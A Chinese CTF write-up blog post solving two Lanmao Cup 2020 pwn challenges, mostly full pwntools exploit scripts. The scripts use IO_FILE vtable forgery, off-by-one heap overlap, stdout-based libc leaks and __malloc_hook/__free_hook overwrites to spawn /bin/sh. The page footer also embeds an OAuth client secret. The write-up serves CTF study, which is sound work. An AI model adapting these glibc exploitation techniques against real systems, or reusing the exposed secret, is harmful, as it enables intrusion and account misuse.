<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    蓝帽杯202020-pwn1&amp;pwn3复现 |
    
    The lair of C0yo7e</title>
  
    <link rel="shortcut icon" href="/images/time.png">
  
  <link rel="stylesheet" href="/css/style.css">
  
    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
  
  <script src="/js/pace.min.js"></script>
</head>
</html>
<body>
<main class="content">
  <section class="outer">
  

<article id="post-蓝帽杯202020-pwn1" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      蓝帽杯202020-pwn1&amp;pwn3复现
    </h1>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/08/09/蓝帽杯202020-pwn1/" class="article-date">
  <time datetime="2020-08-09T09:31:24.000Z" itemprop="datePublished">2020-08-09</time>
</a>
        
      </div>
    

    
      
    <div class="tocbot"></div>





    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>前两天队友们在打蓝帽杯，非警校人员只能赛后看题了</p>
<p>只做了pwn1和pwn3（应该是这个顺序<br>两题都涉及了IO_FILE的知识点利用，刚好最近也在刷IO_FILE就做来练练手了</p>
<a id="more"></a>
<h3 id="camp-pwn1"><a href="#camp-pwn1" class="headerlink" title="camp(pwn1)"></a>camp(pwn1)</h3><p>这真的是赤裸裸考IO_FILE的题啊，完全不需要别的操作，纯往里写，就靠结构知识的感觉</p>
<p>大概是用stdin来leak出libc的地址，然后改stderr的vtable，执行exit的时候会执行IO_flush_all_lockp</p>
<p>跳转到vtable+0x18处执行IO_file_overflow函数<br>我们就填充fake_vtable实现调用one_gadget</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stdout_0</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;&gt;&gt;\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"size:\n"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"content:\n"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stdin_0</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;&gt;&gt;\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"size:\n"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"content:\n"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stderr_0</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;&gt;&gt;\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"size:\n"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"content:\n"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logs</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># stdin_0(0xf0,'a'*0xf0)</span></span><br><span class="line">stdin_0(<span class="number">0x80</span>,<span class="string">'a\n'</span>)</span><br><span class="line">stdin_0(<span class="number">0x80</span>,<span class="string">'a\n'</span>)</span><br><span class="line"><span class="comment"># stdin_0(0x80,'a\n')</span></span><br><span class="line">clean()</span><br><span class="line"><span class="comment"># stdout_0(64,p64(elf.got['write']))</span></span><br><span class="line">stdin_0(<span class="number">0x80</span>,<span class="string">'a'</span>)</span><br><span class="line">logs()</span><br><span class="line">p.recvuntil(<span class="string">"stdin\n"</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x41</span></span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stdin_0(0x80,'a\n')</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">jump=libc_base+libc.symbols[<span class="string">'_IO_file_jumps'</span>]+<span class="number">0xc0</span></span><br><span class="line">fake_vtable = libc_base + <span class="number">0x3c5600</span><span class="number">-8</span></span><br><span class="line"><span class="comment"># fake_vtable = libc_base +0x3c4998-8</span></span><br><span class="line">stdout = libc_base + <span class="number">0x3c5620</span></span><br><span class="line">onegadget=libc_base+<span class="number">0xf02a4</span></span><br><span class="line"><span class="comment"># py = '\x00' + p64(libc_base+0x3c55e0) + p64(0)*3+p64(0x1)+p64(0)+p64(onegadget)+p64(fake_vtable)</span></span><br><span class="line"></span><br><span class="line">stderr = p64(<span class="number">0x00000000fbad2087</span>)+p64(libc_base+<span class="number">0x3c55c3</span>)*<span class="number">7</span></span><br><span class="line">stderr += p64(libc_base+<span class="number">0x3c55c3</span>+<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(stdout)+p64(<span class="number">2</span>)+p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)</span><br><span class="line">stderr += p64(libc_base+<span class="number">0x3c6770</span>)+p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)</span><br><span class="line">stderr += p64(libc_base+<span class="number">0x3c55e0</span>) + p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(onegadget)+p64(fake_vtable)<span class="comment">#+p64(0x00000000ffffffff)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">stderr_0(len(stderr),stderr)</span><br><span class="line"><span class="comment"># stdin_0(0x180,'b')</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size:\n"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x180</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>听说远程很狗，不打比赛就没体验到，本地通了就over吧</p>
<h3 id="safebox-pwn3"><a href="#safebox-pwn3" class="headerlink" title="safebox(pwn3)"></a>safebox(pwn3)</h3><p>一开始我还以为是glibc2.23的版本呢<br>所以用2.23做了一遍，由于2.23对size的检查问题，fakechunk的size一定要符合条件，所以最后getshell不能改free_hook，我就改了malloc为one_gadget</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment"># libc=ELF('./libc.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'b'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'c'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf8</span>,<span class="string">'c'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x20</span>,<span class="string">'d'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xf1'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0,0x30,'a'*0x18+p64(0x91)+p16(0x2620-0x41))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># delete(4)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x70</span>,p16(<span class="number">0x2620</span><span class="number">-0x43</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>,<span class="string">'a'</span>*<span class="number">0x108</span>+<span class="string">'\x71'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'b'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3c5600</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">system = libc_base + <span class="number">0x44e30</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x3c67a8</span></span><br><span class="line">malloc_hook = libc_base+<span class="number">0x3c4b10</span></span><br><span class="line">onegadget=libc_base+<span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">8</span>))</span><br><span class="line">p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x50</span>))</span><br><span class="line">p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x18</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x108</span>,<span class="string">'b'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x68</span>,<span class="string">'c'</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x68</span>,<span class="string">'d'</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x68</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment"># add(13,0x18,'\n')</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xf1'</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x108</span>,<span class="string">'b'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x70</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x108</span>,<span class="string">'a'</span>*<span class="number">0x108</span>+<span class="string">'\x71'</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x68</span>,<span class="string">'d'</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x68</span>,<span class="string">'ddd'</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(onegadget))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">15</span>))</span><br><span class="line">p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>后来发现，原来是2.27的题，其实也没什么不一样，就是要leak地址的话得先malloc largebin<br>然后可以直接覆写低两位的地址，不考虑size位<br>所以我们可以覆盖free_hook再delet实现getshell</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment"># libc=ELF('./libc.so')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">'0'</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0x408</span>,<span class="string">'a'</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'b'</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'c'</span>)</span><br><span class="line">	add(<span class="number">4</span>,<span class="number">0xf8</span>,<span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x68</span>+<span class="string">'\xf1'</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">3</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0x408</span>,<span class="string">'a'</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x70</span>,p16(<span class="number">0x4760</span>))</span><br><span class="line">	add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">'b'</span>)</span><br><span class="line">	add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">'c'</span>)</span><br><span class="line">	</span><br><span class="line">	payload=p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span></span><br><span class="line">	add(<span class="number">7</span>,<span class="number">0x60</span>,payload)</span><br><span class="line">	<span class="comment"># gdb.attach(p)</span></span><br><span class="line">	libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ed8b0</span></span><br><span class="line">	<span class="keyword">print</span> hex(libc_base)</span><br><span class="line">	system = libc_base + libc.symbols[<span class="string">'system'</span>]+<span class="number">0xa0</span></span><br><span class="line">	<span class="keyword">print</span> hex(system)</span><br><span class="line">	free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">	<span class="keyword">print</span> hex(free_hook)</span><br><span class="line"></span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">	p.sendline(str(<span class="number">8</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">	p.sendline(str(<span class="number">0x50</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">	p.send(<span class="string">'a'</span>)</span><br><span class="line">	<span class="comment"># add(8,0x18,'a')</span></span><br><span class="line"></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">	add(<span class="number">9</span>,<span class="number">0x108</span>,<span class="string">'b'</span>)</span><br><span class="line">	add(<span class="number">10</span>,<span class="number">0x70</span>,<span class="string">'c'</span>)</span><br><span class="line">	add(<span class="number">11</span>,<span class="number">0x70</span>,<span class="string">'d'</span>)</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">8</span>)</span><br><span class="line">	add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'\x91'</span>)</span><br><span class="line">	</span><br><span class="line">	delete(<span class="number">10</span>)</span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	</span><br><span class="line">	payload = <span class="string">'A'</span> * <span class="number">0x100</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x80</span>) + p64(free_hook)</span><br><span class="line">	add(<span class="number">9</span>,<span class="number">0x180</span>,payload)</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"></span><br><span class="line">	one_gadget = libc_base + <span class="number">0x4f2c5</span></span><br><span class="line">	add(<span class="number">10</span>,<span class="number">0x70</span>,<span class="string">'/bin/sh\x00'</span>) </span><br><span class="line">	add(<span class="number">12</span>,<span class="number">0x70</span>,p64(system))</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">		libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">		exp()</span><br><span class="line"></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="https://c0yo7e.github.io/2020/08/09/蓝帽杯202020-pwn1/" data-id="ckdmy3l84001azwsw1qsf0rl4"
         class="article-share-link">Share</a>
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>

    </footer>

  </div>

  
    
  <nav class="article-nav">
    
    
      <a href="/2020/08/08/tcache浅析/" class="article-nav-link">
        <strong class="article-nav-caption">Olde posts</strong>
        <div class="article-nav-title">tcache浅析</div>
      </a>
    
  </nav>


  

  
    
  <div class="gitalk" id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: '57453e2505e1523b1d78',
      clientSecret: 'c9d2109f4649be7dca5ef5622d85e38608a7cd1e',
      repo: 'content',
      owner: 'C0yo7e',
      admin: ['C0yo7e'],
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: md5(location.pathname),
      distractionFreeMode: false,  // Facebook-like distraction free mode
      pagerDirection: 'last'
    })

